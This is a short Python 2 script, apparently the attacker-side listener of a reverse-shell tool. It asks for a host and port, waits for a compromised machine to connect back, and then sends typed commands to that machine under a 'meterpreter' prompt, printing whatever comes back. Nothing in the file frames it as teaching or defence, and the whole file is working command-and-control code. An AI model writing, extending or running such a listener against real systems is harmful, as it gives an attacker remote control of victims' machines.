import os
import sys
import socket

def socketCreate():
    try:
        global host
        global port
        global s

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        using = '\33[91;1musing\33[00m(\33[92;1mlistener\33[00m) '
        host = raw_input(using + 'host<( ')
        port = raw_input(using + 'port<( ')
        if port == '':
            socketCreate()
        port = int(port)

    except:
        print('Error occurred')

def socketBind():
    try:
        print('Listening on port ' + str(port))
        s.bind((host,port))
        s.listen(1)
    except:
        print('binding error')
        print('trying')
        socketBind()

def socketAccept():
    global conn
    global addr
    global hostname

    try:
        conn, addr = s.accept()
        print('[*] Sessions Opened | ' + 'IP :\33[92;1m ' + addr[0] + '\33[00m | Port : \33[92;1m' + str(addr[1])+'\33[00m\n')
        
    except:
        print('accepting error ')

def menu():
    while True:
        cmd = raw_input('meterpreter( ')
        if cmd == 'quit':
            conn.close()
            sys.exit()

        command = conn.send(cmd)
        result = conn.recv(16834)
        print(result)


def listener():
    socketCreate()
    socketBind()
    socketAccept()
    menu()

